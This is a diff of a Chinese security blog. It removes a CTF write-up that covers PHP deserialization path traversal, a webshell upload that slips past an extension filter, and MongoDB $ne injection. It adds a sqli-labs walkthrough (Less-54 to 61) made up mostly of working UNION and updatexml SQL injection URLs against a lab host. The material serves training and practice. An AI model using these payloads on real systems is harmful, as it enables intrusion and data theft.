@@ -15,30 +15,18 @@
 
 
 
-<meta name="description" content="前言这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下">
-<meta name="keywords" content="CTF,Misc,Web">
+<meta name="description" content="Less-54从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，">
+<meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安恒6月赛部分做题记录">
-<meta property="og:url" content="0verwatch.top/2018/06/23/anheng-6month/index.html">
+<meta property="og:title" content="sqli-labs实战记录(四)">
+<meta property="og:url" content="0verwatch.top/2018/08/29/sqli-labs-training-4/index.html">
 <meta property="og:site_name" content="0verWatch&#39;s Blog">
-<meta property="og:description" content="前言这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下">
+<meta property="og:description" content="Less-54从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MVuq.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MebV.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MuUU.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MK5F.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MQC4.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9M129.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9M3vR.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MJDx.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9MNVK.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9Ma5D.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/06/23/P9M6qP.png">
-<meta property="og:updated_time" content="2018-06-23T13:32:12.475Z">
+<meta property="og:updated_time" content="2018-08-29T12:04:05.043Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安恒6月赛部分做题记录">
-<meta name="twitter:description" content="前言这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下">
-<meta name="twitter:image" content="https://s1.ax1x.com/2018/06/23/P9MVuq.png">
+<meta name="twitter:title" content="sqli-labs实战记录(四)">
+<meta name="twitter:description" content="Less-54从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -70,7 +58,7 @@
 <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>安恒6月赛部分做题记录 | 0verWatch&#39;s Blog</title>
+<title>sqli-labs实战记录(四) | 0verWatch&#39;s Blog</title>
 
 <script src="//cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js"></script>
 <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
@@ -308,11 +296,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-anheng-6month" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-sqli-labs-training-4" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/06/23/anheng-6month/" class="article-date">
-      <time datetime="2018-06-23T13:30:09.000Z" itemprop="datePublished">2018-06-23</time>
+      <a href="/2018/08/29/sqli-labs-training-4/" class="article-date">
+      <time datetime="2018-08-29T12:01:56.000Z" itemprop="datePublished">2018-08-29</time>
 </a>
 
 
@@ -327,7 +315,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      安恒6月赛部分做题记录
+      sqli-labs实战记录(四)
     </h1>
   
 
@@ -336,13 +324,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    <a class="article-category-link" href="/categories/SQL注入/">SQL注入</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Misc/">Misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -353,24 +341,75 @@
       
           
         
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下<br><a id="more"></a></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Web1-Mynote"><a href="#Web1-Mynote" class="headerlink" title="Web1 Mynote"></a>Web1 Mynote</h3><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。。<br><img src="https://s1.ax1x.com/2018/06/23/P9MVuq.png" alt="P9MVuq.png"></p>
-<p>经过别人的提示，是反序列化以后，多抓几个包看一下<br>在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code><br><img src="https://s1.ax1x.com/2018/06/23/P9MebV.png" alt="P9MebV.png"></p>
-<p>解码发现是个<code>json格式</code>的东西<br><a href="https://imgchr.com/i/P9MuUU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MuUU.md.png" alt="P9MuUU.md.png"></a><br>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $a[] = <span class="string">'../../controllers/Basecontrol.php'</span>;</span><br><span class="line"> $b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"> $c[] = <span class="string">'../../controllers/User.php'</span>;</span><br><span class="line"> $d[] = <span class="string">'../../controllers/Controllers.php.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure>
-<p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;This_1S_A_F4ke_f1aG&#125;"</span>;</span><br></pre></td></tr></table></figure>
-<p>以后看来要勤抓包</p>
-<h3 id="Web2-ezupload"><a href="#Web2-ezupload" class="headerlink" title="Web2 ezupload"></a>Web2 ezupload</h3><p>简单的上传题目<br>先随意上传一个文件发现只能上传图片，那我就用copy命令弄一个图片马上去<br>上传发现<br><img src="https://s1.ax1x.com/2018/06/23/P9MQC4.png" alt="P9MQC4.png"><br>出现路径，网页可以打开，但这个后缀名有点奇怪于是我继续尝试改后缀名为<code>phtml</code>,发现名称又变成了<code>pegml</code><br><img src="https://s1.ax1x.com/2018/06/23/P9M129.png" alt="P9M129.png"><br>于是猜测是否可能是之过滤前三个字母后缀名，这样就可以利用<code>Apache</code>的特性让他执行php代码，于是我把后缀名再改为<code>phtml.php</code>,这次的后缀名变成<code>pegml.php</code>前面的东西<code>Apache</code>肯定不认得，只能乖乖执行PHP了。。<br>于是连一下菜刀成功<br><a href="https://imgchr.com/i/P9M3vR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9M3vR.md.png" alt="P9M3vR.md.png"></a></p>
-<h3 id="Web3-never-give-up"><a href="#Web3-never-give-up" class="headerlink" title="Web3 never give up"></a>Web3 never give up</h3><p>这个题目是<code>mongdb注入</code>，好像大神们都做过啊，就我这渣渣没见过。。。。直接贴图<br><img src="https://s1.ax1x.com/2018/06/23/P9MJDx.png" alt="P9MJDx.png"></p>
-<p>查看页面原代码发现几个页面有<code>title参数</code>，就是他了<br><code>payload</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10000/?title[$ne]=1</span><br></pre></td></tr></table></figure></p>
-<p>原因好像是$ne这个东西有缺陷，<br>此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制<br>因为<code>$ne</code>是<code>MongoDB</code>用来判定条件是否不相等的,所以它会查询登录集合中的所有用户名称不等于1且密码也不等于1的记录。因此,本次查询将返回登录集合中的所有用户。换成SQL的表述法,就等同于以下查询语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username &lt;&gt;   <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">password</span> &lt;&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p>简单讲讲吧，我有点懒就不想多说了<br>两个题目流量分析题目的思路都是一致的先找到应用层的每一次会话，然后在响应里面找到对应的传送信息，两个题目都是图片。。<br><a href="https://imgchr.com/i/P9MNVK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MNVK.md.png" alt="P9MNVK.md.png"></a></p>
-<p>这是其中一个包里面的图片，直接利用<code>html</code>的功能就好<br><img src="https://s1.ax1x.com/2018/06/23/P9Ma5D.png" alt="P9Ma5D.png"><br>得到flag</p>
-<p>另外一个包直接选择分组字节流提取出来直接保存为图片就好,然后<code>notepad++</code>打开，最后一行就是flag<br><img src="https://s1.ax1x.com/2018/06/23/P9M6qP.png" alt="P9M6qP.png"></p>
-<p>最后一题Misc好像是某一个比赛的原题。。。flag也没改，考了一波音频里面藏水印，加一次图片的伸缩，本人电脑没有<code>MATLAB</code>就不弄了</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>做完这题目下午做微机实验汇编懵得一批。。。。。。头晕</p>
+<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure>
+<p>提交获得的信息重置刷新次数</p>
+<h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure>
+<p>提交重置次数</p>
+<h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p>
+<p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure>
+<p>这样才对<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure>
+<p>提交重置次数</p>
+<h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure>
+<p>提交重置次数</p>
+<h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure>
+<p>下面有报错我们可以利用报错注入<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p>提交重置次数</p>
+<h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>提交重置次数</p>
+<h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>此题完结</p>
+<h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>爆详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p>完结</p>
+<h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>
 
       
     </div>
@@ -379,13 +418,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/06/23/anheng-6month/">安恒6月赛部分做题记录</a></p>
+        <p><span>本文标题:</span><a href="/2018/08/29/sqli-labs-training-4/">sqli-labs实战记录(四)</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
-        <p><span>发布时间:</span>2018-06-23, 21:30:09</p>
-        <p><span>最后更新:</span>2018-06-23, 21:32:12</p>
+        <p><span>发布时间:</span>2018-08-29, 20:01:56</p>
+        <p><span>最后更新:</span>2018-08-29, 20:04:05</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/06/23/anheng-6month/" title="安恒6月赛部分做题记录">0verwatch.top/2018/06/23/anheng-6month/</a>
-            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/06/23/anheng-6month/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/29/sqli-labs-training-4/" title="sqli-labs实战记录(四)">0verwatch.top/2018/08/29/sqli-labs-training-4/</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/08/29/sqli-labs-training-4/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -398,15 +437,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/06/24/weiji-experiment/">
-                    微机实验记录
+                <a href="/2018/08/29/sqli-labs-training-2/">
+                    sqli-labs实战记录(二)
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/06/17/python-DataStruct-2/">
-                    数据结构复习二 双向链表(python实现)
+                <a href="/2018/08/29/sqli-labs-training-1/">
+                    sqli-labs实战记录(一)
                 </a>
             </div>
         
@@ -448,7 +487,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1-Mynote"><span class="toc-number">2.1.</span> <span class="toc-text">Web1 Mynote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2-ezupload"><span class="toc-number">2.2.</span> <span class="toc-text">Web2 ezupload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3-never-give-up"><span class="toc-number">2.3.</span> <span class="toc-text">Web3 never give up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.4.</span> <span class="toc-text">MISC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54"><span class="toc-number">1.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-55"><span class="toc-number">2.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-56"><span class="toc-number">3.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-57"><span class="toc-number">4.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-58"><span class="toc-number">5.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-59"><span class="toc-number">6.</span> <span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-60"><span class="toc-number">7.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-61"><span class="toc-number">8.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-62-Less65"><span class="toc-number">9.</span> <span class="toc-text">Less-62-Less65</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小结"><span class="toc-number">10.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
@@ -492,7 +531,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/06/24/weiji-experiment/" title="上一篇: 微机实验记录">
+            <a href="/2018/08/29/sqli-labs-training-2/" title="上一篇: sqli-labs实战记录(二)">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -500,7 +539,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/06/17/python-DataStruct-2/" title="下一篇: 数据结构复习二 双向链表(python实现)">
+            <a href="/2018/08/29/sqli-labs-training-1/" title="下一篇: sqli-labs实战记录(一)">
                 <i class="fa fa-angle-right"></i>
             </a>
         
